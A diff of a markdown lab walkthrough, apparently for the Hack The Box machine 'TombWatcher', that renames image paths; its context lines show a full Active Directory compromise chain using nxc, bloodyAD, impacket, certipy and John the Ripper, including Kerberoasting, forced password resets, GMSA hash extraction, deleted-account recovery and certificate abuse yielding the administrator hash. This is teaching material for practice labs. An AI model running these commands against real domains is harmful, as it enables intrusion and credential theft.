@@ -81,7 +81,7 @@ Enumerate all users and groups in the domain:
 nxc smb 10.129.61.141 -u henry -p 'H3nry_987TGV!' --rid-brute
 ```
 
-![RID Brute Force Enumeration](/assets/img/Pasted%20image%2020260913044126.png)
+![RID Brute Force Enumeration](/assets/img/Pasted_image_20260913044126.png)
 
 The enumeration reveals several domain users including Alfred, Sam, and John, along with various security groups and service accounts.
 
@@ -89,7 +89,7 @@ The enumeration reveals several domain users including Alfred, Sam, and John, al
 
 ## Initial Access - Targeted Kerberoasting
 
-![Kerberoasting Attack Path](/assets/img/Pasted%20image%2020260913084124.png)
+![Kerberoasting Attack Path](/assets/img/Pasted_image_20260913084124.png)
 
 With the WriteSPN privilege over the Alfred user (identified via BloodHound), a targeted Kerberoasting attack can be performed. This involves temporarily adding a Service Principal Name (SPN) to Alfred's account, requesting a Kerberos ticket, and then cracking it offline.
 
@@ -102,7 +102,7 @@ faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
 bloodyAD --host 10.129.61.141 -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' set object alfred servicePrincipalName -v 'HTTP/FakeService'
 ```
 
-![Add SPN to Alfred](/assets/img/Pasted%20image%2020260913045231.png)
+![Add SPN to Alfred](/assets/img/Pasted_image_20260913045231.png)
 
 The SPN is successfully added, making Alfred Kerberoastable.
 
@@ -115,7 +115,7 @@ faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
 impacket-GetUserSPNs 'tombwatcher.htb/henry:H3nry_987TGV!' -dc-ip 10.129.61.141 -request-user Alfred -outputfile hashes.kerberoast
 ```
 
-![Request TGS Ticket](/assets/img/Pasted%20image%2020260913045302.png)
+![Request TGS Ticket](/assets/img/Pasted_image_20260913045302.png)
 
 The Kerberos ticket is extracted and saved to a file for offline cracking.
 
@@ -127,7 +127,7 @@ Use John the Ripper to crack the Kerberos hash against the rockyou.txt wordlist:
 john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-![Crack Kerberos Hash](/assets/img/Pasted%20image%2020260913045330.png)
+![Crack Kerberos Hash](/assets/img/Pasted_image_20260913045330.png)
 
 **Result:** Alfred's password is cracked to **basketball**
 
@@ -140,9 +140,9 @@ nxc smb 10.129.61.141 -u alfred -p 'basketball' -d tombwatcher.htb
 
 Alfred's credentials are validated successfully. Analysis of BloodHound data shows the next escalation path:
 
-![BloodHound Path 1](/assets/img/Pasted%20image%2020260913045706.png)
+![BloodHound Path 1](/assets/img/Pasted_image_20260913045706.png)
 
-![BloodHound Path 2](/assets/img/Pasted%20image%2020260913045732.png)
+![BloodHound Path 2](/assets/img/Pasted_image_20260913045732.png)
 
 ---
 
@@ -157,7 +157,7 @@ faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
 bloodyAD --host 10.129.61.141 -d tombwatcher.htb -u alfred -p 'basketball' add groupMember 'INFRASTRUCTURE' alfred
 ```
 
-![Add to Infrastructure Group](/assets/img/Pasted%20image%2020260913050206.png)
+![Add to Infrastructure Group](/assets/img/Pasted_image_20260913050206.png)
 
 Alfred is successfully added to the Infrastructure group.
 
@@ -169,7 +169,7 @@ Use netexec to read the GMSA password for the ansible_dev$ account:
 nxc ldap 10.129.61.141 -u alfred -p 'basketball' -d tombwatcher.htb --gmsa
 ```
 
-![Extract GMSA Password](/assets/img/Pasted%20image%2020260913050506.png)
+![Extract GMSA Password](/assets/img/Pasted_image_20260913050506.png)
 
 **Extracted GMSA NTLM Hash:** `3eca34dd13a85db79c03178b7b149621`
 
@@ -187,7 +187,7 @@ The GMSA account credentials are validated.
 
 ## Escalation - ForceChangePassword
 
-![ForceChangePassword Path](/assets/img/Pasted%20image%2020260913084429.png)
+![ForceChangePassword Path](/assets/img/Pasted_image_20260913084429.png)
 
 ### Step 1: Change Sam's Password
 
@@ -198,7 +198,7 @@ faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
 bloodyAD -H "10.129.61.141" -d "tombwatcher.htb" -u "ansible_dev$" -p "aad3b435b51404eeaad3b435b51404ee:3eca34dd13a85db79c03178b7b149621" set password "sam" "NewPassword123@@@"
 ```
 
-![Change Sam Password](/assets/img/Pasted%20image%2020260913051210.png)
+![Change Sam Password](/assets/img/Pasted_image_20260913051210.png)
 
 Sam's password is successfully changed.
 
@@ -216,7 +216,7 @@ Sam's account is now accessible.
 
 ## Escalation - WriteOwner and Shadow Credentials
 
-![WriteOwner Attack Path](/assets/img/Pasted%20image%2020260913084515.png)
+![WriteOwner Attack Path](/assets/img/Pasted_image_20260913084515.png)
 
 ### Step 1: Set Owner
 
@@ -227,7 +227,7 @@ faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
 bloodyAD -H "10.129.61.141" -d "tombwatcher.htb" -u "sam" -p "NewPassword123@@@" set Owner "john" "sam"
 ```
 
-![Set Owner](/assets/img/Pasted%20image%2020260913053012.png)
+![Set Owner](/assets/img/Pasted_image_20260913053012.png)
 
 Sam is set as the owner of John's account.
 
@@ -240,7 +240,7 @@ faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
 bloodyAD -H "10.129.61.141" -d "tombwatcher.htb" -u "sam" -p "NewPassword123@@@" add genericAll "john" "sam"
 ```
 
-![Grant GenericAll](/assets/img/Pasted%20image%2020260913053317.png)
+![Grant GenericAll](/assets/img/Pasted_image_20260913053317.png)
 
 GenericAll privilege is successfully granted.
 
@@ -253,7 +253,7 @@ faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
 bloodyAD -H "10.129.61.141" -d "tombwatcher.htb" -u "sam" -p "NewPassword123@@@" set password "john" "johnPassword@@@123"
 ```
 
-![Change John Password](/assets/img/Pasted%20image%2020260913053306.png)
+![Change John Password](/assets/img/Pasted_image_20260913053306.png)
 
 John's password is successfully changed.
 
@@ -283,7 +283,7 @@ An interactive PowerShell session is established as John on the Domain Controlle
 
 ## Privilege Escalation - AD Recycle Bin
 
-![AD Recycle Bin Attack](/assets/img/Pasted%20image%2020260913085000.png)
+![AD Recycle Bin Attack](/assets/img/Pasted_image_20260913085000.png)
 
 ### Step 1: Enumerate Deleted Objects
 
@@ -293,7 +293,7 @@ TombWatcher exploits the Tombstone attack to enumerate deleted objects in the AD
 Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
 ```
 
-![Enumerate Deleted Objects](/assets/img/Pasted%20image%2020260913060510.png)
+![Enumerate Deleted Objects](/assets/img/Pasted_image_20260913060510.png)
 
 A deleted user named cert_admin is discovered with ObjectGUID `938182c3-bf0b-410a-9aaa-45c8e1a02ebf`.
 
@@ -357,7 +357,7 @@ faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
 certipy req -ca tombwatcher-CA-1 -username cert_admin -p 'P@sswordlinux!' -dc-ip 10.129.61.141 -template WebServer -application-policies '1.3.6.1.4.1.311.20.2.1' -upn administrator@tombwatcher.htb -target-ip 10.129.61.141
 ```
 
-![Request Certificate](/assets/img/Pasted%20image%2020260913070523.png)
+![Request Certificate](/assets/img/Pasted_image_20260913070523.png)
 
 A certificate is issued with the injected Certificate Request Agent policy.
 
@@ -381,7 +381,7 @@ faketime "$(ntpdate -q 10.129.61.141 | cut -d ' ' -f 1,2)" \
 certipy auth -pfx administrator.pfx -dc-ip 10.129.61.141
 ```
 
-![Extract Administrator Credentials](/assets/img/Pasted%20image%2020260913070914.png)
+![Extract Administrator Credentials](/assets/img/Pasted_image_20260913070914.png)
 
 **Administrator NT Hash:** `f61db423bebe3328d33af26741afe5fc`
 
